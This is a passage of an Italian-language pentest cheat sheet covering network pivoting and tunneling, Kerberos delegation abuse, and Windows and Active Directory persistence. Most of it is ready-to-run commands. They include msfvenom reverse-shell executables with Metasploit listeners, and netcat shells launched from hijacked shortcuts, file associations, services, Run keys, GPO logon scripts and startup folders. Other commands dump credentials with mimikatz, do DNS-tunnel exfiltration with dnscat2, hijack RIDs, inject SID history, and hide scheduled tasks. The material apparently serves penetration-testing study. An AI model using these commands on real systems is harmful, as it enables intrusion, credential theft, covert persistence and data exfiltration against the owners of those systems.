_Senza Proxysocks non avremmo avuto la possibilità di forwardare i pacchetti di nmap per scannerizzare le subnet scritte perchè solo con una semplice connessione SSH non sarebbe stato possibile_

- _Metasploit e Proxychains:_

_Possiamo utilizzare le proxychains insieme a metasploit con la sua vasta gamme di moduli_

_Comandi:_
<!-- -->
      proxychains msfconsole #comando per avviare msfconsole con le proxychains
<!-- -->
- _RDP e Proxychains:_

_Abbiamo la possibilità di connettersi con RDP passando sempre per le proxychains, quindi per esempio accedere ad una macchina che normalemnete non sarebbe accessibile_

_Comandi:_
<!-- -->
      proxychains xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution #comando per avviare una connessione RDP utilizzando le proxychains
<!-- -->
- _Shuttle via SSH:_

_Shuttle è uno script python che funziona solo tramite SSH, è abbastanza veloce perchè in pochi comandi prepara tutte le route table_

_Comandi:_
<!-- -->
      sudo apt-get install sshuttle #comando per installare sshuttle
<!-- -->
      sudo sshuttle -r <nome user>@<ip> <subnet> -v # #comando che si connette ad SSH e aggiunge alle route table la subnet specificata
<!-- -->
_Questi 2 comandi hanno permesso di prepare il tutto e possiamo lanciare dei comandi esempio:_
<!-- -->
`mmap -v -sV -p3389 192.168.5.23 -A -Pn`
<!-- -->
- _Netsh:_

_Netsh (Network shell) è la shell messa a disposizione da windows per l'ordinaria amministrazione di rete per un pc windows ma nel nostro caso può essere usato a nostro vantaggio come: scoprire eventuali rotte di rete, vedere la configurazione del firewall, aggiungere proxy, ecc..._

_Comandi:_
<!-- -->
      netsh.exe interface portproxy add <protcollo> listenport=<porta in ascolto> listenaddress=<ip in ascolto> connectport=<porta a cui connettersi> connectaddress=<ip a cui connettersi>
      #comando che fa il forwarding di una porta remota ad una porta in ascolto 
<!-- -->
      netsh.exe interface portproxy show <protocollo> #comando per visualizzare com'è avvenuto il forward delle porte
<!-- -->
ES: `netsh.exe interface portproxy add v4tov4 listenport=7000 listenaddress=12.122.13.13 connectport=139 connectaddress=173.14.22.22`

_Andando ad utilizzare il socket __"12.122.13.13:7000"__ che ha forwardato la porta __"139"__ alla sua __"7000"__, potremmo visionare il servizio SMB_
<!-- -->

- _Chisel:_

_Chisel è un tool di tunneling molto utilizzato perchè scritto nel linguaggio Go quindi ha anche un fattore di velocità a suo vantaggio, sfrutta pure lui socks_

_Comandi:_
<!-- -->
      git clone https://github.com/jpillora/chisel.git 
      cd chisel
      sudo apt install gccgo-go 
      go build #comandi per copiare e preparare il tool
<!-- -->
      scp chisel <nome utente@<ip>:<path dove salvarlo> #comando per passare il binario di chisel alla macchina vittima
<!-- -->
_Chisel permette due modalità la standard dove il chisel server è la macchina vittima mentre il chisel client è la nostra macchina ma può accadere che vi sia di mezzo un firewall che blocchi le connessioni in entrata ed è per questo che chisel mette a disposizione la modalità __"reverse"__ cioè il chisel server lo diventerà la nostra macchina mentre il chisel client lo sarà la macchina vittima_

__N.B: Le vaarie librerie Go a disposizione nelle macchine target potrebbero non essere aggiornato o del tutto mancanti, quindi va posta un po' di attenzione__

_Chisel standard:_
<!-- -->
      chisel server -v -p <porta> --socks5 #comando che avvia il chisel server sulla macchina vittima con utilizzo di socks5 e si tiene in ascolto su una porta selezionata
<!-- -->
      chisel client -v <ip server chisel>:<porta server chisel in ascolto> socks #comando che avvia il chisel client sulla nostra macchina ed esegue la connessione
<!-- -->
      nano /etc/proxychains.conf #comando che permette la modifica del file proxychains.conf
      socks5 127.0.0.1 1080 #scritta da aggiungere alla fine del file per utilizzare socks5 in quanto sia chisel client che chisel server ascoltano al socket di rete 127.0.0.1:1080
<!-- -->
_Chisel reverse:_
<!-- -->
      chisel server --reverse -v -p <porta> --socks5 #comando che avvia il chisel server sulla nostra macchina con utilizzo di socks5 e si tiene in ascolto su una porta selezionata
<!-- -->
      chisel client -v <ip server chisel>:<porta server chisel in ascolto> R:socks #comando che avvia il chisel client sulla macchina vittima ed esegue la connessione
 <!-- -->     
      nano /etc/proxychains.conf #comando che permette la modifica del file proxychains.conf
      socks5 127.0.0.1 1080 #scritta da aggiungere alla fine del file per utilizzare socks5 in quanto sia chisel client che chisel server ascoltano al socket di rete 127.0.0.1:1080
<!-- -->
_Ora tranquillamente con entrambi i metodi possiamo lanciare tranquillamente un comando per esempio verso un host sotto subnet che non potevamo raggiungere prima_
<!-- -->
ES: `proxychains xfreerdp /v:192.168.2.13 /u:user /p:pass #esempio di un comando che esegue una connessione RDP verso una macchina che prima non era possibile raggiungere` 
<!-- -->

- __Reverse shell via forwarding:__

_Ottenere una revshell via forwarding consiste nel sapersi muovere con le porte in modo da poter ottenere una revshell di una macchina non accessibile dall'esterno_

_In questo caso verrà esaminato l'insieme del dynamic port forwarding e del remote port forwarding per ottenere una revshell, abbiamo 3 macchine una kali machine la nostra macchina, un ubuntu server di mezzo e una windows server per ottenere una revshell_

_Spiegazione tecnica:_

kali machine con listener meterpreter su 0.0.0.0:8000---> SSH che binda la porta 8080 dell'ubuntu con la 8000 della kali machine ----> ubuntu server con porta 8080 in ascolto ----> windows server con eseguibile malevolo che se runnato punta alla porta 8080 e indirizzo del server ubuntu, il quale server tramite comando SSH binda la sua 8080 alla 8000 della kali e che alla fine ci fa ottenere la revshell

_Comandi:_
<!-- -->
      ssh -D 9050 <nome user>@<ip ubuntu server> #comando che si connette con SSH al ubuntu server e abilita alla kali machine i proxysocks
<!-- -->
      proxychains xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution #comando per avviare una connessione RDP utilizzando le proxychains, la windows ha la porta 
      RDP aperta
<!-- -->
      msfvenom -p windows/x64/meterpreter/reverse_https lhost= <ip ubuntu server> -f exe -o <nome eseguibile>.exe LPORT=8080 #comando che crea l'eseguibile che punta alla 
      porta 8080 dell'ubuntu
<!-- -->
      msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 0.0.0.0; set lport 8000; exploit" #comando che crea il listener 
      sulla kali
<!-- -->
_Ora andrà passato prima l'eseguibile all'ubuntu server e poi alla windows machine per sapere come fare andare [qui](./#downloadupload-file) per poi bindare tutte le porte con il comando SSH specifico_
<!-- -->
      ssh -R <ip ubuntu server>:8080:0.0.0.0:8000 ubuntu@<ip ubuntu server> -vN #comando che si connette all'ubuntu server e binda in remote la porta 8080 dell'ubuntu server con la 8000 della kali
<!-- -->
_eseguiamo il .exe malevolo __"(abbiamo la connessione RDP alla windows)"__ e potremo notare che al listener sarà avvenuta la connessione_

- __Socat Forwarding:__

_Socat può essere utilizzato quando SSH non è disponibile, ed è anche molto piu "forte" in quando utilizzandolo su una macchina vittima permette di aprire un listener su una porta e nel mentre si può fare il binding con un'altra porta_

__N.B: va caricato sulla macchina compromessa e può essere maggiormente rilevabile rispetto al semplice SSH.
i comandi ssh utilizzati vengono lanciati dalla macchina compromessa verso le macchine target.__
 
_Comandi:_
<!-- -->
      socat TCP4-LISTEN:<port macchina compromessa>,fork TCP4:<ip target>:<porta target> #comando per bindare una porta con socat e in seguito utilizzarla
<!-- -->
ES:

`socat TCP4-LISTEN:3389,fork TCP4:3.5.4.3:3389`

_Andremo a bindare la porta della 3389 della macchina compromessa alla 3389 del ip specificato, per poi poterla visitare tramite browser_

`TCP4-LISTEN:80,fork TCP4:<ip_della_nostra_macchina>:80`

_Andremo a bindare la porta 80 della macchina compromessa alla 80 della nostra machine._

- __DNS Tunneling:__

_Il dns tunneling sfrutta lo stesso concetto del SSH tunneling solo tramite il protocollo DNS ed ha il vantaggio di essere meno rilevabile, in quanto in una rete le richieste DNS possono essere moltissime mentre quelle SSH molte di meno_

- _DnsCat2:_

_Tool in ruby utilizzato per il dns tunneling per esfiltra i dati, va settato un server sulla nostra macchina e un client sulla macchina vittima_

_Comandi:_
<!-- -->
      git clone https://github.com/iagox86/dnscat2.git 
      cd dnscat2/server/
      sudo gem install bundler
      bundle install #comando per copiare e rendere operativo il tool
<!-- -->
      sudo ruby dnscat2.rb --dns host=<ip della propria macchina>,port=53,domain=<dominio se c'è> --no-cache #comando che setta il server 
<!-- -->
__N.B: ricordarsi di copiare e incollare il campo --secret dopo aver avviato il server, perchè la chiave verrà passata poi al client per l'autenticazione__
<!-- -->
      git clone https://github.com/lukebaggett/dnscat2-powershell.git #comando per scaricare il .ps1 da mandare alla macchina windows target
<!-- -->
__N.B: il .ps1 va passato alla macchina vittima__
<!-- -->
      Import-Module .\dnscat2.ps1 #comando che importa il modulo nella powershell 
<!-- -->
      Start-Dnscat2 -DNSserver <ip server dns> -Domain <dominio se c'è> -PreSharedSecret <chiave per l'autenticazione> -Exec <comando da eseguire> #comando che prepara il client DNS sulla macchina vittima
<!-- -->
      dnscat2> ? #comando di dnscat2 per aprire l'help
<!-- -->
      dnscat2> windows -i <num finestra creata> #comando di dnscat2 per entrare nella finestra creata con il dns tunneling
<!-- -->
__N.B: il tool ha un ritardo abbastanza sostanzioso nel mandare e ricevere i comandi__
<!-- -->
- __ICMP Tunneling con Socks:__

_L'ICMP tunneling consiste nel tunneling tramite un client e un server, vengono sfruttati i pacchetti ICMP.
Vi è un però in questo tipo di tunneling è possibile solo se il firewall permette di utilizzare il comando ping all'interno della rete_

_Comandi:_
<!-- -->
      git clone https://github.com/utoni/ptunnel-ng.git
      cd ptunnel-ng
      sudo apt install autoconf #installarlo se non si ha il pacchetto
      sudo ./autogen.sh #comandi per costruire ptunnerl.ng
<!-- -->
      sudo ./ptunnel-ng -r<ip server> -R<port> #comando per impostare l'ICMP server sulla macchina target
<!-- -->
      sudo ./ptunnel-ng -p<ip locale> -l<porta locale> -r<ip server remoto> -R<porta remota> #comando per impostare il client sulla macchina target
<!-- -->
      ssh -p<porta locale> -lubuntu 127.0.0.1 #comando che si connette a SSH tramite ICMP tunneling
<!-- -->
      ssh -D 9050 -p<porta locale> -lubuntu 127.0.0.1 #comando che oltre a connettersi attiva proxysocks
<!-- -->
      proxychains nmap -sV -sT <ip host target> -p<porta target> #comando che utilizza nmap su un host target tramite proxychains
<!-- -->

- __SocksOverRDP e Proxifier:__

_SocksoverRDP è un tool che utilizza i DVC(Dynamic Virtual Channels) del RDP per il tunneling delle connessioni del remote desktop protocol_

_Link ai tool:_

1) [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP/releases), tool per il tunneling RDP

2) [Proxifier](https://www.proxifier.com/download/#win-tab), tool per il proxychains

_Comandi:_

_Allora come primi passi dobbiamo scaricare __"SocksOverRDPx64.zip"__ e __"Proxifier"__, i file .zip vanno passati alla pivot machine (python server) e vanno decompressi, andrà poi importata una DLL e fatta la connessione RDP con la macchina target_
<!-- -->
      python3 -m http.server 80 #comando per avviare il webserver
<!-- -->
      curl -o <nome>.zip http://<ip macchina kali>/<zip di sockoverRDP>.zip #comando per passare dalla nostra macchina alla pivot machine SockOverRDP
<!-- -->
_Estraiamo la cartella e i due file .exe e .dll li trasferiamo nel desktop, avviamo una powershell come amministratori e inviamo il seguente comando_
<!-- -->
      regsvr32.exe SocksOverRDP-Plugin.dll #comando per importare la .dll
<!-- -->
      mstsc.exe #comando che avvia un eseguibile per la connessione a Remote Desktop Protocol verso la macchina target
<!-- -->
_Adesso andrà fatto un ulteriore spostamento del __"SocksOverRDPx64.zip"__ verso la target machine, per farlo possiamo creare sulla pivot machine una cartella condivisibile tramite SMB e con all'interno i 2 file del .zip_
<!-- -->
     creare una nuova cartella-> inserire i due .file .dll e .exe-> click destro proprietà-> condivisione-> condivisione avanzata-> condvidi cartella #passi per creare la cartella condivisibile
<!-- -->
     \\<ip pivot host>\<nome cartella> #comando che se inserito su esplora risorse, inserite le credenziali possiamo accedere alla cartella condivisibile e scaricare i due file
<!-- -->
_trasferiamo i 2 file nel desktop apriamo una shell privilegiata e eseguiamo questi 2 comandi:_
<!-- -->
      regsvr32.exe SocksOverRDP-Plugin.dll #comando per importare la .dll
<!-- -->
      .\SocksOverRDP-Server.exe #comando per avviare il server che farà da tunneling
<!-- -->
_Ritornando sulla pivot machine, aprendo un cmd shell e lanciano il seguente comando:_
<!-- -->      
      netstat -antb | findstr 1080 #comando che lista le connessione e poi ricerca per stringa con valore 1080
      TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING #output comando
<!-- -->
_Possiamo notare un socket di rete aperto sul localhost alla porta 1080, in ascolto su ogni interfaccia di rete e ogni porta, questo sta a significare che il SOCKS listener è stato avviato; ora non resta che avviare proxifier con i seguenti passi:_
<!-- -->
      profile-> proxy servers-> add-> ip 127.0.0.1 porta 1080 protocollo SOCKS5-> ok #passi per preparare il tool proxifier
<!-- -->
_Ora tutto è pronto, il proxy server è impostato, ogni comando inviato passerà da lui per poi continuare la sua strada verso la pivot machine tramite RDP_

- __Sito per mappe mentali:__

_Il pivoting tra diverse macchine può diventare tedioso perchè può capitare che un host vadi off, che una subnet venga cambiata e mille altri modi è quindi importante tenere con se una piccola mappa mentale tramite il sito [diagrams](https://app.diagrams.net/)_

##### Varie:

- __Kerberos Delegation:__

_Le kerberos delegation permettono ad un servizio o applicazione di utilizzare le proprie credenziali kerberos a nome di un'altro utente, esistono 3 tipi di delegation: Unconstrained Delegation, Constrained Delegation e Resource-based Delegation_

1) Unconstrained Delegation = il più permissivo permette ad un servizio o applicazione di presentare le proprie credenziali a chiunque

2) Constrained Delegation = meno permissivo perchè al servizio o applicazione viene specificato solo a quali altri poter dare le proprie credenziali kerberos

3) Resource-based Delegation = in questo caso le policy di delegazione sono all'interno della risorsa stessa (servizio, computer, applicazione) e specificherà chi può presentare le credenziali kerberos

- _Constrained Delegation:_

_Comandi:_

_Il primo passo è enumerare il sistema per vedere eventuali delegazione (vedere voce __"msds_allowedtodelegateto"__) e lo facciamo tramite [powerview](./#Powerview)_
<!-- -->
     Import-Module .\PowerView.ps1 #comando per importare powerview
<!-- -->
     Get-NetUser -TrustedToAuth #comando powerview per vedere le delegazioni
<!-- -->
_Utilizziamo mimikatz per recuperare le credenziali dell'user che ha le delegation_
<!-- -->
     mimikatz.exe token::elevate #comando per impersonare SYSTEM
<!-- -->    
     mimikatz.exe lsadump::secrets #comando per recupere credenziali in chiaro
<!-- -->
_Continuiamo con il tool [Rubeus](https://github.com/GhostPack/Rubeus) per trasformare la password in NTLM hash_
<!-- -->
     Rubeus.exe hash /password:<password> #comando per convertire la password in NTLM hash
<!-- -->
     Rubeus.exe s4u /user:<nome utente con delegation> /rc4:<NTLM hash> /domain:<dominio> /impersonateuser:<user per cui richiedere TGT da kerberos> /msdsspn:"<SPN domain controller>" /dc:<domain contorller> 
     /ptt #comando che utilizzando l'utente con constrained delegation richiede il TGT ad un'altro utente
<!-- -->
     klist #comando per vedere i ticket in cache e se sono stati injectati
<!-- -->
- _Resource-based Delegation:_

_Comandi:_

_Il primo passo è enumerare il sistema per vedere eventuali delegazione e lo facciamo tramite [powerview](./#Powerview)_
<!-- -->
     Import-Module .\PowerView.ps1 #comando per importare powerview
<!-- -->
     Get-NetUser -TrustedToAuth #comando powerview per vedere le delegazioni
<!-- -->
_Utilizziamo mimikatz per recuperare le credenziali dell'user che ha le delegation_
<!-- -->
     mimikatz.exe token::elevate #comando per impersonare SYSTEM
<!-- -->    
     mimikatz.exe lsadump::secrets #comando per recupere credenziali in chiaro
<!-- -->
_Ora utilizziamo [kekeo](https://github.com/gentilkiwi/kekeo), tool per convertire i ticket o injectarli_
<!-- -->
     tgt::ask /user:<utente> /domain:<dominio> /password:<password> #comando per creare TGT
<!-- -->
     tgs::s4u /tgt:<nome TGT creato>kirbi /user:<nome user da impersonare> /service:<nome servizio da impersonare> #comando per creare il TGS allo user da impersonare
<!-- -->
_Infine con mimikatz importiamo i ticket TGS_
<!-- -->
     kerberos::ptt <nome ticket>.kirbi #comando per passare il ticket
<!-- -->
_Da qui in poi potremmo ora utilizzare il servizio tramite delegation_

### Persistence:

_La persistence è la pratica di mantenere un'accesso alla macchina compromessa, perchè non è sempre e possibile rientrare con le stesse metodologie adottate nella foothold inziale_

##### Gruppi:

__E' richiesto di avere un'account con privilegi__

_La prima tecnica di persistenza è quella di aggiungere un utente meno privilegiato ad un gruppo che invece abbia più permessi come l'administrators group, il backup operators group o il remote management users.
Per ogni gruppo ci sono vantaggi e svantaggi, l'administrators da molti privilegi ma può dare nell'occhio, il backup operators ha meno privilegi ma può dumpare SAM e SYSTEM e vedere le chiavi di registro e il remote management users permette il controllo da remoto (RDP)_

_Comandi:_
<!-- -->
       net localgroup <nome gruppo> <nome utente> /add #comando CMD per aggiungere un utente al gruppo 
<!-- -->
_La connessione da remoto però innesca l'attivazione del __"LocalAccountTokenFilterPolicy"__ policy dell' [UAC](./#uac) che toglie i poteri d'amministratori, derivati dai gruppi se connessi da remoto_
<!-- -->
       reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 #comando per disattivare la 
       policy
<!-- -->
- __Gruppi annidati:__

_La tecnica consiste nel creare diversi gruppi dove di volta in volta aggiungiamo gruppi fasulli per poi aggiungere un gruppo come quello degli amministratori a questo nido di gruppi e infine aggiungere il nostro utente che avrà i privilegi del gruppo di amministratori_

_Comandi:_
<!-- -->
      New-ADGroup -Path "OU=<nome ou>,OU=<nome ou>,DC=<nome DC>,DC=<altro nome DC>,DC=<altro nome DC>" -Name "<nome gruppo>" -SamAccountName "<nome SAM>" -   
      DisplayName "<nome che vogliamo mostrare" -GroupScope Global -GroupCategory Security #comando per creare un gruppo
<!-- -->
 _Quindi creiamo quanti gruppi voglamo per poi aggiungere uno ad uno con questo comando_
<!-- -->
      Add-ADGroupMember -Identity "<nome SAM gruppo d'aggiungere>" -Members "<nome SAM gruppo annidato>" #comando per aggiungere un gruppo ad un altro gruppo
<!-- -->      
__Continuando ad aggiungere gruppo dentro ad altri gruppi poi va aggiunto un gruppo di amministratori o qualsiasi cosa si voglia__

_Aggiungimi l'user al gruppo iniziale_
<!-- -->
      Add-ADGroupMember -Identity "<nome SAM gruppo iniziale>" -Members "<nome SAM user>" #comando per aggiungere l'user ad un gruppo
<!-- -->
      Get-ADGroupMember -Identity "<nome gruppo admin>" #comando per controllare se l'user è nel gruppo di admin
<!-- -->
- __AdminSDHolder:__

_AdminSDHolder è un template container presente in ogni dominio che ogni 60 minuti tramite il processo SDProp applica la sua ACL a tutti i gruppi considerati protetti di cui ne fanno anche parte Domain admins, Administrators, Enterprise Admins, ecc..._

_Comandi:_ 
<!-- -->
     runas /netonly /user:<dominio>\<utente> cmd.exe #comando per aprire una nuova shell con l'utente selezionato
<!-- -->
     mmc #comando per aprire microsoft management console
<!-- -->
     File-> aggiungi/rimuovi snap-in-> Active directory Utenti e Computer-> AdminSDHolder-> click destro-> Proprietò-> sicurezza-> aggiungi->
     aggiungiamo il nostro utente-> controlli nomi-> permessi completi-> attendere 60 minuti e il nostro utente avrà il controllo completo sui gruppi protetti
     #passi per aggiungere l'user scelto da noi alla cartella AdminSDHolder con permessi completi
<!-- -->
_Esiste altrimenti lo [script](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1) che può semplificarci la vita_

- __GPO (Group Policy Management):__

_il GPO si occupa del controllo delle policy di configurazione locale delle varie macchine all'interno dell'AD, per esempio ha il compito di tenere le configurazione dell'AV o quali script devono runnare al boot del computer_

_Due tecniche comuni per la persistence contro la GPO:_

 1) Restricted Group Membership: permette l'accesso ad ogni host nell'AD

 2) Logon Script Deployment: decisione su quale script runna ogni volta che il pc viene avviato, esempio una revshell

_Comandi:_

__N.B: I .bat sono più stabili con la GPO__

     msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<porta> -f exe > <nome eseguibile>.exe #comando per creare un'eseguibile con all'interno   
     una revshell

     msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <porta>;exploit"
     #comando per startare il listener sulla nostra machine

     mmc #comando per aprire il microsoft management console

     File-> aggiungimi/rimuovi snap-in-> GPO-> aggiungi-> cliccare su qualsiasi OU si voglia-> creare una GPO con qualsiasi nome-> click destro-> applica
     poi-> Group Policy Management Editor-> policies-> impostazioni finestre-> scripts-> Logon-> proprietà-> selezionare il nostro script con la revshell->
     applica e ok #passi completi per aggiungere la propria GPO policy che funziona ad ogni boot del pc

     andare sulla nostra OU selezionata-> delega-> click destro sul gruppo ottenuto con la revshell-> modifica impostazioni-> elimina,modifica sicurezza->
     click sugli altri gruppi e li rimuoviamo-> sicurezza-> avanzate-> rimuovi il proprietario dai permessi-> sempre in sicurezza aggiungi clicchiamo->    
     aggiungiamo Domain computers-> gli diamo i permessi di lettura-> clicchiamo ok e rimuoviamo l'ultimo gruppo rimasto #passi completi per non fare leggere la nostra GPO

##### Privilegi:

_I privilegi possono essere fonte di persistenza, in quanto vi sono alcuni di loro che danno più poteri del necessario_

- __SeBackupPrivilege/SeRestorePrivilege:__

_Sono due priviliegi che danno molto potere, __"SeBackupPrivilege"__ permette di leggere ogni file nel sistema invece __"SeRestorePrivilege"__ permette di scrivere ogni file del sistema, avendo tali poteri è possibile modificare qualsiasi cosa._

1) Modifica policy di sicurezza:

_Comandi:_
<!-- -->
      secedit /export /cfg <nome file>.inf #comando per esportare le policy di sicurezza locale
<!-- -->
_Avendola esportata potremmo aggiungere degli account nei diversi privilegi che vediamo scritti e poi ricaricarla nel sistema_
<!-- -->
      secedit /import /cfg <nome file>.inf /db config.sdb #comando che importa la nuova configurazione modificata nel database di sicurezza
<!-- -->
      secedit /configure /db config.sdb /cfg <nome file>.inf #comando che applica la configurazione importata nel database di sicurezza
<!-- -->
##### Servizi:

_La modifica di servizi già esistenti o la creazione di nuovi può essere utilizzato a nostro favore_

- __Backdoor nei servizi:__

_La modifica della path del binario a cui punta un servizio può essere utilizzata per la creazione di una backdoor_

_Comandi:_
<!-- -->
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe-service -o <nome eseguibile>.exe #commando che crea un eseguibile con al suo 
      interno una revshell
<!-- -->
      sc.exe create <nome servizio> binPath= "<path dell'eseguibile>" start= auto #comando per creare un servizio che punti all'eseguibile
<!-- -->
      sc.exe start <nome servizio> #comando per avviare il servizio
<!-- -->
- __Modificare servizi:__

_La possibilità di modificare i servizi già presenti può essere utilizzato a nostro vantaggio e da meno nell'occhio_

_Comandi:_
<!-- -->
      sc.exe query state=all #comando per listare tutti i servizi
<!-- -->
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe-service -o <nome eseguibile>.exe #commando che crea un eseguibile con all'suo interno una revshell
<!-- -->
      sc.exe config <nome servizio da modificare> binPath= "<path dell'eseguibile>" start= auto obj= "<account che utlizza il servizio>" #comando per modificare un servizio
<!-- -->   
##### File:

- __Eseguibili:__

_Un file eseguibile apre le porte a moltissime opzioni di persistenza come una piccola backdoor_

_Commandi:_
<!-- -->
      msfvenom -a x64 --platform windows -x <nome eseguibile utilizzato>.exe -k -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<porta> -b "\x00" -f exe -o 
      <nome nuovo eseguibile>.exe #comando per generare un eseguibile con al suo interno una revshell
<!-- -->

- __Shortcut file:__

_Anche le shortcut possono essere fonti di backdoor andandole a modificare_

_Comandi:_
<!-- -->
      Script.ps1: #nome dello script con di seguito il codice da scriverci
      Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <ip> <porta>" #comando che runna un processo che si collega ad un dato ip e porta
      C:\Windows\System32\<nome eseguibile>.exe #avvio dell'eseguibile che verrà modificato
<!-- -->
      powershell.exe -WindowStyle hidden C:\Windows\Tools\script.ps1 #comando da sostituire alla destinazione del collegamento
<!-- -->
      shortcut-> proprietà-> destinazione -> script creato da noi #path per modificare il collegamento
<!-- -->

- __Hijacking ProgID:__

_Un file possiede una determinata estensione, bene è possibile andare a modificare il ProgID di quela file (Viene spiegato [qui](./#bypass-uac) cos'è il ProgID, nell'exploit con fodhelper)_

_Comandi:_
<!-- -->
      HKEY_LOCAL_MACHINE\SOFTWARE\classes\.<estensione> #path per vedere il nome del ProgID
<!-- -->
 ES: `HKEY_LOCAL_MACHINE\SOFTWARE\classes\.txt  = txfile/txtlegacy`
<!-- -->
      HKEY_LOCAL_MACHINE\SOFTWARE\classes\<nome ProgID>\shell\open\command #path dove troviamo l'eseguibile che viene ricercato ogni volta che apriamo una 
      determinata estensione
<!-- -->     
      Script.ps1: #nome dello script con di seguito il codice da scriverci
      Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <ip> <porta>" #comando che runna un processo che si collega ad una dato ip e porta
      C:\Windows\system32\<nome eseguibile>.exe  #comando che runna l'eseguibile
<!-- -->
      powershell.exe -WindowStyle hidden C:\Windows\Tools\script.ps1 #valore da cambiare al default value della chiave di registro
<!-- -->  
###### Registri:

_I registri sono una componente fondamentale in windows che se modificati a nostro vantaggio possono tornare molto utili_

- __Registri di avvio:__

_Il target sono questi sottoregistri di avvio:_

    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
    
__N.B: HKCU si applica solo all'utente corrente, HKLM si applica a tutti; la key "Run" avvia gli eseguibili al suo interno ogni volta che vi è il login mentre "RunOnce" solo una volta.__

_Comandi:_
<!-- -->
       msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
<!-- -->
       Editor registri-> HKLM\Software\Microsoft\Windows\CurrentVersion\Run-> creiamo un value di tipo REG_EXPAND_SZ che punta al path del nostro eseguibile 
       #passi per creare un value che punti al nostro eseguibile
###### Varie:

__E' richiesto di avere un'account con privilegi__

- __Secure Descriptor (WinRM):__

_Possiamo permettere ad un nostro utente creato per la persistence di poter loggare da remoto tramite la modifica del secure desciptor_

_Comandi:_
<!-- -->
      Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI #comando per aprire graficamente il WinRM secure descriptor
<!-- -->
      selezionare l'utente -> controllo completo #passi per applicare la modifiche
<!-- -->
- __RID Hijacking:__

_Il RID è un'identificativo numerico per i vari utenti ed è utilizzato dal LSASS infatti quando vi è un'accesso LSASS collega il RID di un utente ad un token di accesso dell'UAC.
Andando a fare l'Hijacking del RID un semplice utente può risultare come un admin_

_Comandi:_
<!-- -->
      Get-LocalUser | fl * #comando per ottenere info sugli utenti, specialmente per capire il RID dell'admin
<!-- -->
      PsExec64.exe -i -s regedit #comando per avviare regedit con privilegi di amministratore
<!-- -->
      HKLM\SAM\SAM\Domains\Account\Users\ #path per modificare i RID
<!-- -->
_Nella folder Users, potremmo notare diverse altre subfolder con numeri esadecimale, se convertiti in decimale possiamo ricavare il RID ottenuto con il comando in powershell; ora non ci rimane che selezionare la subfolder del nostro utente, andare al valore __"F"__ che conterrà il RID (storato in little-endian) e modificarlo con quello dell'admin_

ES:

`Admin = RID(500) ->  Esadecimale(0x1F4) -> Subkey(000001F4)`

`UserMalevolo = RID(502) -> Esadecimale(0x1F6) -> Subkey(000001F6) -> Value F che verrà cambiato da (F6 10) in (F4 10)`

_UserMalevolo una volta rieffettuato il login avrà i privilegi di admin_

- __SID History:__

_Una history dei SID che ha avuto un'utente con i relativi permessi di cui godeva_

_Comandi:_
<!-- -->
     Get-ADUser <nome utente> -properties sidhistory #comando che recupera la SID history
<!-- -->
     Get-ADGroup "<nome gruppo>" #comando per recuperare il SID del gruppo che in seguito verrà utilizzato
<!-- -->
     Stop-Service -Name ntds -force #comando per fermare il servizio ntds, in quanto bisogna apportare delle modifiche al DB dell'AD
<!-- -->
_Ora entra in gioco un [tool](https://github.com/MichaelGrafnetter/DSInternals) che ci permette di modificare la SID history_
<!-- -->
     Add-ADDBSidHistory -SamAccountName '<nome SAM>' -SidHistory '<SID che vogliamo aggiungere>' -DatabasePath C:\Windows\NTDS\ntds.dit 
     #comando per aggiungere il SID al NTDS.dit
<!-- -->
     Start-Service -Name ntds #comando per riavviare il servizio ntds
<!-- -->
- __Task Scheduler:__

_Il Task scheduler oltre ad essere fonte di [Privilege escalation](./#privilege-escalation) è utilizzato nella persistence tramite la creazione o di un nuovo task o della modifica di uno già esistente può ritornarci molto utile_

_Comandi:_
<!-- --> 
      schtasks /create /sc minute /mo 10 /tn <nome task> /tr "<path programma o comando da eseguire" /ru <utente che lo esegue> #creazione di un task che si esegue ogni 10 minuti
<!-- --> 
      schtasks /query /tn <nome task> #comando per vedere lo stato del nostro task
<!-- --> 
_Vi è la possibilità di rendere un visibile un task, andando ad eliminare il suo secure descriptor(SD) nelle chiavi di registro._      
<!-- --> 
      regedit #comando per aprire regedit
<!-- --> 
      HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<nome task da modificare> #path dove si trova SD del task da eliminare
<!-- --> 
      SD #nome del valore da eliminare
<!-- --> 
_Andando a fare una query del nostro task potremmo vedere che vi sarà un errore del sistema che non lo troverà._

- __Cartella Startup:__

_Ogni utente in un sistema windows dispone di una propria cartella che quando viene effettuato il login avvia degli eseguibili, quindi con i permessi necessari potremmo inserire un nostro payload_

_Comandi:_
<!-- -->
      C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup #path della cartella startup
<!-- -->
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<porta> -f exe -o <nome eseguibile>.exe #comando per creare un'eseguibile con revshell
<!-- -->
_Ora va passato sulla target machine e inserito nella path della cartella startup._

- __WinLogon:__

_Spiegazione di WinLgon [qui](./#processi-di-avvio)_

